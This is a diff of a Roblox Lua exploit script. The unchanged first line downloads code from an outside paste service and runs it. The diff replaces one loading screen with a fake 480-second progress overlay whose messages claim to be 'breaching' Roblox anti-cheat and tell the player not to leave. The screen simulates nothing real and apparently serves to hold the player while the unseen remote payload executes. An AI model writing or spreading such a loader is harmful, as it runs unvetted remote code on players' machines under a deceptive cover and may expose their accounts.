@@ -1,86 +1,131 @@
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/yyLNMLAqkeHEsxCX/raw", true))()
-local gui = Instance.new("ScreenGui")
-gui.Name = "GrowGui"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.Parent = game:GetService("CoreGui")
-local bg = Instance.new("Frame", gui)
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.Position = UDim2.new(0, 0, 0, 0)
-bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-local gradient = Instance.new("UIGradient", bg)
-gradient.Color = ColorSequence.new{
-  ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
-  ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 40, 80)),
-  ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = PlayerGui
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(128, 0, 128) -- Purple
+background.BackgroundTransparency = 1 -- Start fully transparent
+background.Parent = screenGui
+local rectangle = Instance.new("Frame")
+rectangle.Size = UDim2.new(0.95, 0, 0.4, 0) -- 95% wide, 40% tall
+rectangle.Position = UDim2.new(0.5, 0, 0.5, 0) -- perfect center
+rectangle.AnchorPoint = Vector2.new(0.5, 0.5)
+rectangle.BackgroundColor3 = Color3.fromRGB(75, 0, 130) -- Pure violet
+rectangle.BackgroundTransparency = 1 -- Start fully transparent
+rectangle.Parent = screenGui
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 20)
+uiCorner.Parent = rectangle
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 4
+uiStroke.Color = Color3.fromRGB(200, 150, 255)
+uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+uiStroke.Parent = rectangle
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 150, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 150, 255))
+})
+uiGradient.Rotation = 45
+uiGradient.Parent = uiStroke
+
+local mainTexts = {
+    "BREACHING ROBLOX ANTI CHEAT SYSTEM..",
+    "DO NOT LEAVE TO BE STILL UNDETECTED",
+    "OVERRIDING SECURITY PROTOCOLS...",
+    "INJECTING STEALTH MODULES...",
+    "ACCESSING INTERNAL SYSTEMS..."
 }
-gradient.Rotation = 45
-local title = Instance.new("TextLabel", bg)
-title.Size = UDim2.new(1, 0, 0.2, 0)
-title.Position = UDim2.new(0, 0, 0.05, 0)
-title.Text = "🌴 GROW A\nGARDEN 🌴"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextScaled = true
-title.Font = Enum.Font.GothamBlack
-title.BackgroundTransparency = 1
-local sub = Instance.new("TextLabel", bg)
-sub.Size = UDim2.new(1, 0, 0.05, 0)
-sub.Position = UDim2.new(0, 0, 0.3, 0)
-sub.Text = ""
-sub.TextColor3 = Color3.fromRGB(200, 200, 200)
-sub.TextScaled = true
-sub.Font = Enum.Font.Gotham
-sub.BackgroundTransparency = 1
-local discord = Instance.new("TextLabel", bg)
-discord.Size = UDim2.new(1, 0, 0.05, 0)
-discord.Position = UDim2.new(0, 0, 0.37, 0)
-discord.Text = "discord.gg/darkzzscripterzz"
-discord.TextColor3 = Color3.fromRGB(150, 150, 150)
-discord.TextScaled = true
-discord.Font = Enum.Font.Code
-discord.BackgroundTransparency = 1
-local percent = Instance.new("TextLabel", bg)
-percent.Size = UDim2.new(1, 0, 0.1, 0)
-percent.Position = UDim2.new(0, 0, 0.48, 0)
-percent.Text = "0%"
-percent.TextColor3 = Color3.fromRGB(255, 255, 255)
-percent.TextScaled = true
-percent.Font = Enum.Font.GothamBold
-percent.BackgroundTransparency = 1
-local status = Instance.new("TextLabel", bg)
-status.Size = UDim2.new(1, 0, 0.05, 0)
-status.Position = UDim2.new(0, 0, 0.57, 0)
-status.Text = "Initializing..."
-status.TextColor3 = Color3.fromRGB(180, 180, 180)
-status.TextScaled = true
-status.Font = Enum.Font.Gotham
-status.BackgroundTransparency = 1
-local message = "Script Loading Please Wait for a While"
-task.spawn(function()
-  for i = 1, #message do
-    sub.Text = string.sub(message, 1, i)
-    wait(0.05)
-  end
-end)
-local statuses = {
-  "Initializing...",
-  "Connecting...",
-  "Checking Environment...",
-  "Injecting...",
-  "Bypassing...",
-  "Loading Functions...",
-  "Preparing Interface...",
-  "Almost Done...",
-  "Success!"
+local waitTexts = {
+    "Injecting stealth modules...",
+    "Calibrating sensors...",
+    "Encrypting network traffic...",
+    "Masking IP address...",
+    "Deploying cloaking device..."
 }
-task.spawn(function()
-  for i = 0, 100 do
-    percent.Text = i .. "%"
-    if i % 12 == 0 and i/12 + 1 <= #statuses then
-      status.Text = statuses[math.floor(i / 12) + 1]
+local mainText = Instance.new("TextLabel")
+mainText.Size = UDim2.new(0.95, 0, 0.2, 0)
+mainText.Position = UDim2.new(0.5, 0, 0.25, 0) -- top half of rectangle
+mainText.AnchorPoint = Vector2.new(0.5, 0.5)
+mainText.BackgroundTransparency = 1
+mainText.Text = mainTexts[1]
+mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
+mainText.TextScaled = true
+mainText.Font = Enum.Font.Arcade
+mainText.TextTransparency = 1
+mainText.Parent = rectangle
+local waitText = Instance.new("TextLabel")
+waitText.Size = UDim2.new(0.95, 0, 0.15, 0)
+waitText.Position = UDim2.new(0.5, 0, 0.55, 0) -- middle of rectangle
+waitText.AnchorPoint = Vector2.new(0.5, 0.5)
+waitText.BackgroundTransparency = 1
+waitText.Text = waitTexts[1]
+waitText.TextColor3 = Color3.fromRGB(200, 200, 200)
+waitText.TextScaled = true
+waitText.Font = Enum.Font.Arcade
+waitText.TextTransparency = 1
+waitText.Parent = rectangle
+local loadingBarFrame = Instance.new("Frame")
+loadingBarFrame.Size = UDim2.new(0.95, 0, 0.08, 0)
+loadingBarFrame.Position = UDim2.new(0.5, 0, 0.85, 0) -- bottom of rectangle
+loadingBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+loadingBarFrame.BackgroundTransparency = 1
+loadingBarFrame.Parent = rectangle
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(200, 150, 255)
+loadingBar.BackgroundTransparency = 1
+loadingBar.Parent = loadingBarFrame
+local barStroke = Instance.new("UIStroke")
+barStroke.Thickness = 2
+barStroke.Color = Color3.fromRGB(255, 255, 255)
+barStroke.Parent = loadingBarFrame
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 10)
+barCorner.Parent = loadingBarFrame
+local function fadeIn()
+    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
+    TweenService:Create(background, fadeInfo, {BackgroundTransparency = 0.7}):Play()
+    TweenService:Create(rectangle, fadeInfo, {BackgroundTransparency = 0}):Play()
+    TweenService:Create(mainText, fadeInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(waitText, fadeInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(loadingBarFrame, fadeInfo, {BackgroundTransparency = 0}):Play()
+    TweenService:Create(loadingBar, fadeInfo, {BackgroundTransparency = 0}):Play()
+end
+local function animateLoadingBar()
+    local tweenInfo = TweenInfo.new(480, Enum.EasingStyle.Linear)
+    local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+    tween:Play()
+    tween.Completed:Connect(function()
+        mainText.Text = "Success"
+    end)
+end
+local function cycleText(label, textList)
+    local index = 1
+    while true do
+        wait(6)
+        TweenService:Create(label, TweenInfo.new(0.7), {TextTransparency = 1}):Play()
+        wait(0.7)
+        index = index % #textList + 1
+        label.Text = textList[index]
+        TweenService:Create(label, TweenInfo.new(0.7), {TextTransparency = 0}):Play()
+        wait(0.7)
     end
-    wait(math.random(45, 75) / 100)
-  end
-  wait(1)
-  gui:Destroy()
+end
+fadeIn()
+animateLoadingBar()
+
+spawn(function()
+    cycleText(mainText, mainTexts)
+end)
+
+spawn(function()
+    cycleText(waitText, waitTexts)
 end)
